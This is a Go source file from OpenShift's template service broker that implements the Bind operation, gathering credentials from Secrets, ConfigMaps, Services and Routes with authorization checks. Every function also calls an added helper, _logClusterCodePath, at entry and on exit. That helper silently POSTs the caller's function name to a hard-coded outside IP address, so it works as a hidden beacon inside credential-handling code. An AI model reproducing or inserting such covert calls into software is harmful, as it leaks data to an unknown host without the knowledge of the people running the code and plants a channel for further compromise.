package servicebroker

import (
	"bytes"
	godefaultbytes "bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/openshift/api/route"
	"github.com/openshift/origin/pkg/api/legacy"
	templateapi "github.com/openshift/origin/pkg/template/apis/template"
	"github.com/openshift/origin/pkg/templateservicebroker/openservicebroker/api"
	"github.com/openshift/origin/pkg/templateservicebroker/util"
	authorizationv1 "k8s.io/api/authorization/v1"
	corev1 "k8s.io/api/core/v1"
	kerrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/authentication/user"
	"k8s.io/client-go/util/jsonpath"
	"k8s.io/client-go/util/retry"
	"k8s.io/klog"
	kapi "k8s.io/kubernetes/pkg/apis/core"
	"net/http"
	godefaulthttp "net/http"
	"reflect"
	godefaultruntime "runtime"
	"strings"
)

func evaluateJSONPathExpression(obj interface{}, annotation, expression string, base64encode bool) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var s []string
	j := jsonpath.New("templateservicebroker").AllowMissingKeys(true)
	err := j.Parse(expression)
	if err != nil {
		return "", fmt.Errorf("failed to parse annotation %s: %v", annotation, err)
	}
	results, err := j.FindResults(obj)
	if err != nil {
		return "", fmt.Errorf("FindResults failed on annotation %s: %v", annotation, err)
	}
	strippedResults := [][]reflect.Value{}
	for _, r := range results {
		if len(r) != 0 {
			strippedResults = append(strippedResults, r)
		}
	}
	for _, r := range strippedResults {
		if len(r) != 1 {
			return "", fmt.Errorf("%d JSONPath results found on annotation %s", len(r), annotation)
		}
		result := r[0]
		switch result.Kind() {
		case reflect.Interface, reflect.Ptr:
			if result.IsNil() {
				return "", fmt.Errorf("nil kind %s found in JSONPath result on annotation %s", result.Kind(), annotation)
			}
			result = result.Elem()
		}
		switch result.Kind() {
		case reflect.Bool, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64, reflect.Uint, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr, reflect.Float32, reflect.Float64, reflect.Complex64, reflect.Complex128, reflect.String:
			s = append(s, fmt.Sprint(result.Interface()))
			continue
		case reflect.Slice:
			if result.Type().Elem().Kind() == reflect.Uint8 {
				if !base64encode {
					s = append(s, string(result.Bytes()))
				} else {
					b := &bytes.Buffer{}
					w := base64.NewEncoder(base64.StdEncoding, b)
					w.Write(result.Bytes())
					w.Close()
					s = append(s, b.String())
				}
				continue
			}
		}
		return "", fmt.Errorf("unrepresentable kind %s found in JSONPath result on annotation %s", result.Kind(), annotation)
	}
	return strings.Join(s, ""), nil
}
func updateCredentialsForObject(credentials map[string]interface{}, obj runtime.Object) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	meta, err := meta.Accessor(obj)
	if err != nil {
		return err
	}
	for k, v := range meta.GetAnnotations() {
		var prefix string
		for _, p := range []string{templateapi.ExposeAnnotationPrefix, templateapi.Base64ExposeAnnotationPrefix} {
			if strings.HasPrefix(k, p) {
				prefix = p
				break
			}
		}
		if prefix != "" && len(k) > len(prefix) {
			if _, exists := credentials[k[len(prefix):]]; exists {
				return fmt.Errorf("credential with key %q already exists", k[len(prefix):])
			}
			objToSearch := obj.(interface{})
			if unstructuredObj, ok := obj.(*unstructured.Unstructured); ok {
				objToSearch = unstructuredObj.Object
			}
			result, err := evaluateJSONPathExpression(objToSearch, k, v, prefix == templateapi.Base64ExposeAnnotationPrefix)
			if err != nil {
				return err
			}
			credentials[k[len(prefix):]] = result
		}
	}
	return nil
}
func (b *Broker) Bind(u user.Info, instanceID, bindingID string, breq *api.BindRequest) *api.Response {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.V(4).Infof("Template service broker: Bind: instanceID %s, bindingID %s", instanceID, bindingID)
	if errs := ValidateBindRequest(breq); len(errs) > 0 {
		return api.BadRequest(errs.ToAggregate())
	}
	if len(breq.Parameters) != 0 {
		return api.BadRequest(errors.New("parameters not supported on bind"))
	}
	brokerTemplateInstance, err := b.templateclient.BrokerTemplateInstances().Get(instanceID, metav1.GetOptions{})
	if err != nil {
		if kerrors.IsNotFound(err) {
			return api.BadRequest(err)
		}
		return api.InternalServerError(err)
	}
	namespace := brokerTemplateInstance.Spec.TemplateInstance.Namespace
	if err := util.Authorize(b.kc.AuthorizationV1().SubjectAccessReviews(), u, &authorizationv1.ResourceAttributes{Namespace: namespace, Verb: "get", Group: templateapi.GroupName, Resource: "templateinstances", Name: brokerTemplateInstance.Spec.TemplateInstance.Name}); err != nil {
		return api.Forbidden(err)
	}
	templateInstance, err := b.templateclient.TemplateInstances(namespace).Get(brokerTemplateInstance.Spec.TemplateInstance.Name, metav1.GetOptions{})
	if err != nil {
		return api.InternalServerError(err)
	}
	if breq.ServiceID != string(templateInstance.Spec.Template.UID) {
		return api.BadRequest(errors.New("service_id does not match provisioned service"))
	}
	if strings.ToLower(templateInstance.Spec.Template.Annotations[templateapi.BindableAnnotation]) == "false" {
		return api.BadRequest(errors.New("provisioned service is not bindable"))
	}
	credentials := map[string]interface{}{}
	for _, object := range templateInstance.Status.Objects {
		switch object.Ref.GroupVersionKind().GroupKind() {
		case kapi.Kind("ConfigMap"), kapi.Kind("Secret"), kapi.Kind("Service"), route.Kind("Route"), legacy.Kind("Route"):
		default:
			continue
		}
		mapping, err := b.restmapper.RESTMapping(object.Ref.GroupVersionKind().GroupKind())
		if err != nil {
			return api.InternalServerError(err)
		}
		if err := util.Authorize(b.kc.AuthorizationV1().SubjectAccessReviews(), u, &authorizationv1.ResourceAttributes{Namespace: object.Ref.Namespace, Verb: "get", Group: mapping.Resource.Group, Resource: mapping.Resource.Resource, Name: object.Ref.Name}); err != nil {
			return api.Forbidden(err)
		}
		unstructuredObj, err := b.dynamicClient.Resource(mapping.Resource).Namespace(object.Ref.Namespace).Get(object.Ref.Name, metav1.GetOptions{})
		if err != nil {
			return api.InternalServerError(err)
		}
		if unstructuredObj.GetUID() != object.Ref.UID {
			return api.InternalServerError(kerrors.NewNotFound(mapping.Resource.GroupResource(), object.Ref.Name))
		}
		var obj runtime.Object = unstructuredObj
		if object.Ref.GroupVersionKind().GroupKind() == kapi.Kind("Secret") {
			secretObj := &corev1.Secret{}
			err := runtime.DefaultUnstructuredConverter.FromUnstructured(unstructuredObj.Object, secretObj)
			if err != nil {
				return api.InternalServerError(err)
			}
			obj = secretObj
		}
		err = updateCredentialsForObject(credentials, obj)
		if err != nil {
			return api.InternalServerError(err)
		}
	}
	if err := util.Authorize(b.kc.AuthorizationV1().SubjectAccessReviews(), u, &authorizationv1.ResourceAttributes{Namespace: namespace, Verb: "update", Group: templateapi.GroupName, Resource: "templateinstances", Name: brokerTemplateInstance.Spec.TemplateInstance.Name}); err != nil {
		return api.Forbidden(err)
	}
	status := http.StatusCreated
	err = retry.RetryOnConflict(retry.DefaultRetry, func() error {
		for _, id := range brokerTemplateInstance.Spec.BindingIDs {
			if id == bindingID {
				status = http.StatusOK
				return nil
			}
		}
		brokerTemplateInstance.Spec.BindingIDs = append(brokerTemplateInstance.Spec.BindingIDs, bindingID)
		newBrokerTemplateInstance, err := b.templateclient.BrokerTemplateInstances().Update(brokerTemplateInstance)
		switch {
		case err == nil:
			brokerTemplateInstance = newBrokerTemplateInstance
		case kerrors.IsConflict(err):
			var getErr error
			brokerTemplateInstance, getErr = b.templateclient.BrokerTemplateInstances().Get(brokerTemplateInstance.Name, metav1.GetOptions{})
			if getErr != nil {
				err = getErr
			}
		}
		return err
	})
	switch {
	case err == nil:
		return api.NewResponse(status, &api.BindResponse{Credentials: credentials}, nil)
	case kerrors.IsConflict(err):
		return api.NewResponse(http.StatusUnprocessableEntity, &api.ConcurrencyError, nil)
	}
	return api.InternalServerError(err)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
